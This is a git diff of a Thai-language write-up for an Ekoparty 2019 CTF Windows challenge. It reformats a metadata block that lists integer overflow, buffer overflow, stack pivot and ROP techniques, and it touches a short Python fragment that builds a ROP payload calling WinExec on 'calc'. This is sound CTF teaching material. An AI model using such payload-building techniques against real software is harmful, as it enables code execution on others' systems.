@@ -38,10 +38,10 @@ Integer Overflow ใน msg_size ทำให้เราสามารถส�
 
 ## Exploitation
 
-**Tested on:** Windows 10 x64 Build 1909
-**Language:** Python3
-**Technique:** Integer Overflow, Buffer Overflow, Information Leak, Stack Pivot, Return-Oriented Programming(ROP)
-**Exploit:** [exploit.py](https://github.com/jusmistic/BFS-Ekoparty-ctf-2019/blob/master/exploit.py)
+**Tested on:** Windows 10 x64 Build 1909<br>
+**Language:** Python3<br>
+**Technique:** Integer Overflow, Buffer Overflow, Information Leak, Stack Pivot, Return-Oriented Programming(ROP)<br>
+**Exploit:** [exploit.py](https://github.com/jusmistic/BFS-Ekoparty-ctf-2019/blob/master/exploit.py)<br>
 
 1. **Integer Overflow** 
 
@@ -204,7 +204,7 @@ Integer Overflow ใน msg_size ทำให้เราสามารถส�
     # msg += b"B"*(0x8)
     msg += b"\x63\x61\x6c\x63\x00\x00\x00\x00"
     msg += b"A"*(0x38-0x8) # Alignment for add rsp, 0x38
-    msg += p64(winExec) # Error here <-------- Need Fix by debug before function exe
+    msg += p64(winExec) 
     msg += add_esp_0x78 # 0x1c0-0x78 = 0x148
     msg += b"A"*0x78
     msg += add_esp_0x78 # 0x1c0-0x78-0x78 = 0xd0
